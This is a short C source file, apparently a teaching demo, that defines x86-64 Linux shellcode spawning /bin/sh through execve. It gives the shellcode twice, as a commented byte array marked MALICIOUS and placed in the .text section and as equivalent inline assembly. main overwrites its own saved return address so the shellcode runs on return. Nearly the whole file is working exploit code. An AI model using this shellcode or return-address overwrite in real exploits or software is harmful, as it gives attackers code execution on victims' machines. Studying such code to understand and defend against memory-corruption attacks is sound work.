#undef ASSEMBLY

#if !defined(ASSEMBLY)
#define MALICIOUS __attribute__ ((section(".text")))

MALICIOUS char my_execve[] =
	"\x48\x8d\x05\x20\x00\x00\x00"          /* lea    0x20(%rip),%rax    */
	"\xff\xe0"                              /* jmpq   *%rax              */
	"\x48\xc7\x44\x24\x08\x00\x00\x00\x00"  /* movq   $0x0,0x8(%rsp)     */
	"\x48\x8b\x3c\x24"                      /* mov    (%rsp),%rdi        */
	"\x48\x89\xe6"                          /* mov    %rsp,%rsi          */
	"\x48\xc7\xc2\x00\x00\x00\x00"          /* mov    $0x0,%rdx          */
	"\xb8\x3b\x00\x00\x00"                  /* mov    $0x3b,%eax         */
	"\x0f\x05"                              /* syscall                   */
	"\x48\x8d\x05\xdb\xff\xff\xff"          /* lea    -0x25(%rip),%rax   */
	"\xff\xd0"                              /* callq  *%rax              */
	"\x2f\x62\x69\x6e\x2f\x73\x68\x00"      /* .string \"/bin/sh\"       */
	;
#endif

int main(int argc, char **argv)
{
	int ret = 0;

#if defined(ASSEMBLY)
	__asm__("lea 0x20(%rip),%rax");         /* load 'call' block address
	                                           to $rax. Note: $rip is
	                                           that of the next op       */
	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
	__asm__("movq $0x0,0x8(%rsp)");         /* terminate execve's argv
	                                           array with a NULL         */
	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
	                                           execve's 1st param        */
	__asm__("mov %rsp,%rsi");               /* set argv array address as
	                                           execve's 2nd param        */
	__asm__("mov $0x0,%rdx");          	/* set NULL for execve's 3rd
	                                           parameter */
	__asm__("mov $0x3b,%eax");              /* set 0x3b - execve's
	                                           system call id in $eax    */
	__asm__("syscall");                     /* execute the system call   */
	__asm__("lea -0x25(%rip),%rax");        /* prepare to call back to
	                                           after the jmp instruction */
	__asm__("callq *%rax");                 /* call back to after the
	                                           jmp instruction           */
	__asm__(".string \"/bin/sh\"");         /* execution string for
	                                           execve                    */
#else
	*(((unsigned long*)(&ret + 1)) + 1) = (unsigned long)my_execve;
#endif
	return ret;
}

